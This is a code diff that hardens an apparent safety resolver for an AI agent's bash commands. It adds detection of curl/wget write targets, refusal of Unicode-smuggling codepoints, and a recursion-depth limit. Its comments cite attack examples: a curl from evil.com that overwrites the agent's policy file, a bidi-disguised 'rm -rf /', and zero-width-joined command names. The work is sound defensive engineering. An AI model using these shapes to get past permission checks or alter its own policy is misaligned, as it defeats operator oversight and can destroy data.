@@ -315,19 +315,73 @@ const cmdMvCp: CommandResolver = (positional, _tokens, ctx) => {
   };
 };
 
-const cmdCurlWget: CommandResolver = (positional, tokens) => {
+const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
   if (tokens.some((t) => t === '--proxy' || t === '-x')) {
     return { refuse: 'curl/wget: proxy-shaped flags suggest evasion' };
   }
+  // Detect `-o <path>` / `--output <path>` (curl) and `-O` /
+  // `--output-document` (wget); also support combined-form
+  // `-o<path>` and `--output=<path>` shapes (slice 98, R2 #200).
+  // Pre-slice the resolver emitted ONLY `net-egress:<host>` for
+  // these shapes, hiding the WRITE side of the call from the
+  // capability audit and the §11 protected-path check. An
+  // adversarial `curl evil.com/payload -o /etc/agent/policy.toml`
+  // would slip past both layers because `/etc/agent/policy.toml`
+  // never appeared as a write target. Slice 98 emits the write
+  // capability so the engine's protected-path classifier sees the
+  // target and §11 fires for the `/etc/*` escalate tier.
+  //
+  // wget's `-O <file>` is the same shape as curl's `-o`; both
+  // resolvers also honor `wget -P <dir>` (prefix directory). For
+  // forms we can't decisively map (`-O-` writes to stdout, `-O` with
+  // no operand is wget syntactic noise), we don't emit a write
+  // capability — the URL-side egress still covers the net side, and
+  // the operator's modal will see the literal command.
+  const writeTargets: string[] = [];
+  for (let i = 0; i < tokens.length; i += 1) {
+    const t = tokens[i] ?? '';
+    // curl long form `--output=<path>`
+    if (t.startsWith('--output=')) {
+      const target = t.slice('--output='.length);
+      if (target.length > 0) writeTargets.push(target);
+      continue;
+    }
+    // curl short combined form `-o<path>` (no space)
+    if (t.length > 2 && t.startsWith('-o') && !t.startsWith('--')) {
+      writeTargets.push(t.slice(2));
+      continue;
+    }
+    // wget long form `--output-document=<path>`
+    if (t.startsWith('--output-document=')) {
+      const target = t.slice('--output-document='.length);
+      if (target.length > 0) writeTargets.push(target);
+      continue;
+    }
+    // Separated forms: `-o <path>`, `--output <path>`, `-O <path>`,
+    // `--output-document <path>`. Skip the value-less degenerate
+    // shape `-O-` (writes to stdout) and `-O` followed by another
+    // flag (likely a typo; let the operator's modal catch it).
+    if (t === '-o' || t === '--output' || t === '-O' || t === '--output-document') {
+      const next = tokens[i + 1];
+      if (next !== undefined && next !== '-' && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+    }
+  }
   const urlToken = positional[0];
+  const writeCaps = writeTargets.map((p) => writeFs(resolveArg(p, ctx)));
   if (urlToken === undefined) {
-    return { capabilities: [netEgress('*')], confidence: 'medium' };
+    return { capabilities: [netEgress('*'), ...writeCaps], confidence: 'medium' };
   }
   try {
     const host = new URL(urlToken).hostname.toLowerCase();
-    return { capabilities: [netEgress(host || '*')], confidence: 'high' };
+    return {
+      capabilities: [netEgress(host || '*'), ...writeCaps],
+      confidence: 'high',
+    };
   } catch {
-    return { capabilities: [netEgress('*')], confidence: 'medium' };
+    return { capabilities: [netEgress('*'), ...writeCaps], confidence: 'medium' };
   }
 };
 
@@ -542,13 +596,63 @@ const isPunctuationType = (t: string): boolean =>
   t === '"' ||
   t === "'";
 
+// Codepoint ranges that smuggle non-ASCII tokens past byte-equality
+// checks (slice 98, R2 #196). The tree-sitter bash grammar tokenizes
+// strictly on bytes — fullwidth `；` (U+FF1B) parses as a `word`
+// child, NOT as a `;` punctuation node, so a deny pattern matching
+// the literal `';'` is silently bypassed; same for zero-width
+// joiners hidden inside command names (`gi‍t status` reads as
+// `git status` to a human and to most rendering layers but is a
+// different byte sequence to the resolver), and bidi overrides
+// (U+202E reverses display order, so an adversarial source line
+// looks like `cat README` while executing `rm -rf /`).
+//
+// Defense: refuse any literal carrying these codepoints. The
+// resolver's `Refuse` outcome short-circuits the call with a stable
+// reason — operators can author rules against the recognized
+// shape, and the LLM gets an explicit error rather than a silent
+// success on the wrong literal. ASCII-only is the right boundary:
+// non-ASCII filenames are legitimate (UTF-8 paths exist), but they
+// MUST go through the operator's modal where the literal is
+// previewed in full; bypassing rule matching on the resolver side
+// would erase that intervention.
+const isFullwidthAscii = (cp: number): boolean => cp >= 0xff00 && cp <= 0xffef;
+const isZeroWidth = (cp: number): boolean =>
+  cp === 0x200b ||
+  cp === 0x200c ||
+  cp === 0x200d ||
+  cp === 0xfeff ||
+  cp === 0x2060 ||
+  cp === 0x180e;
+const isBidiOverride = (cp: number): boolean =>
+  (cp >= 0x202a && cp <= 0x202e) || (cp >= 0x2066 && cp <= 0x2069);
+const isC1Control = (cp: number): boolean => cp >= 0x0080 && cp <= 0x009f;
+
+const containsUnicodeBypass = (text: string): boolean => {
+  for (const ch of text) {
+    const cp = ch.codePointAt(0);
+    if (cp === undefined) continue;
+    if (isFullwidthAscii(cp) || isZeroWidth(cp) || isBidiOverride(cp) || isC1Control(cp)) {
+      return true;
+    }
+  }
+  return false;
+};
+
 // Extracts the literal text of a `word`, `string`, `raw_string`, or
 // `concatenation` node. Returns null when the node carries embedded
 // expansion / substitution — those should already have been refused
 // by the whitelist walk; this is a defensive secondary check.
+//
+// Unicode-bypass check (slice 98, R2 #196): every extracted literal
+// runs `containsUnicodeBypass`. A match returns null, surfaced by
+// the walker as `bash_shape_not_recognized: dynamic content inside
+// string arg` — same refuse semantics as embedded substitution.
 const literalText = (node: Node): string | null => {
-  if (node.type === 'word' || node.type === 'raw_string') return node.text;
-  if (node.type === 'string') {
+  let raw: string;
+  if (node.type === 'word' || node.type === 'raw_string') {
+    raw = node.text;
+  } else if (node.type === 'string') {
     // string can contain string_content children and optional
     // string_expansion / command_substitution. If any of those red-
     // flag children exist we refuse upstream — here we just join the
@@ -557,9 +661,8 @@ const literalText = (node: Node): string | null => {
       if (child !== null && RED_FLAG_NODES.has(child.type)) return null;
     }
     // strip surrounding quotes; tree-sitter includes them as children
-    return node.text.replace(/^["']|["']$/g, '');
-  }
-  if (node.type === 'concatenation') {
+    raw = node.text.replace(/^["']|["']$/g, '');
+  } else if (node.type === 'concatenation') {
     let acc = '';
     for (const child of node.children) {
       if (child === null) continue;
@@ -568,8 +671,11 @@ const literalText = (node: Node): string | null => {
       acc += inner;
     }
     return acc;
+  } else {
+    return null;
   }
-  return null;
+  if (containsUnicodeBypass(raw)) return null;
+  return raw;
 };
 
 // Map a `file_redirect` node's operator + target into a RedirectShape.
@@ -602,12 +708,27 @@ interface WalkResult {
   refuse?: string;
 }
 
+// Recursion depth ceiling for `walkAst` (slice 98, R2 #198). A
+// pathologically nested input — say, 10,000 levels of brace groups
+// `{{{ ... }}}` — would otherwise blow the JS stack on `visit`'s
+// recursive call into children, taking down the engine before the
+// resolver could refuse with a structured envelope. 64 is well
+// above legitimate shell shapes (the deepest realistic real-world
+// pipeline is ~8 levels) and well below the Node 24 default
+// stack budget (which permits ~1500 deep recursion in practice
+// but varies by build). Refuse with a stable reason so audit /
+// modal can surface the cause cleanly.
+const MAX_AST_DEPTH = 64;
+
 // Walk the AST starting at the program root. Validates every node
 // against WHITELIST_NODE_TYPES and RED_FLAG_NODES; decomposes
 // `command` nodes into shapes.
 const walkAst = (root: Node): WalkResult => {
   const commands: CommandShape[] = [];
-  const visit = (node: Node): string | null => {
+  const visit = (node: Node, depth: number): string | null => {
+    if (depth > MAX_AST_DEPTH) {
+      return `bash_shape_not_recognized: ast_depth_exceeded (>${MAX_AST_DEPTH})`;
+    }
     // Red-flag check first — beats whitelist if a node is both
     // (e.g. expansion that happens to be enumerated in whitelist).
     const redFlag = RED_FLAG_NODES.get(node.type);
@@ -659,7 +780,7 @@ const walkAst = (root: Node): WalkResult => {
           shape.redirects.push(r);
         } else if (!isPunctuationType(child.type)) {
           // Recurse into red-flag check / unknown.
-          const refuse = visit(child);
+          const refuse = visit(child, depth + 1);
           if (refuse !== null) return refuse;
         }
       }
@@ -678,7 +799,7 @@ const walkAst = (root: Node): WalkResult => {
       const before = commands.length;
       for (const child of node.children) {
         if (child === null) continue;
-        const refuse = visit(child);
+        const refuse = visit(child, depth + 1);
         if (refuse !== null) return refuse;
       }
       // Merge any file_redirects that appeared as siblings into the
@@ -703,13 +824,13 @@ const walkAst = (root: Node): WalkResult => {
     // recurse into children — the walk validates each level.
     for (const child of node.children) {
       if (child === null) continue;
-      const refuse = visit(child);
+      const refuse = visit(child, depth + 1);
       if (refuse !== null) return refuse;
     }
     return null;
   };
 
-  const refuse = visit(root);
+  const refuse = visit(root, 0);
   if (refuse !== null) return { refuse };
   return { commands };
 };
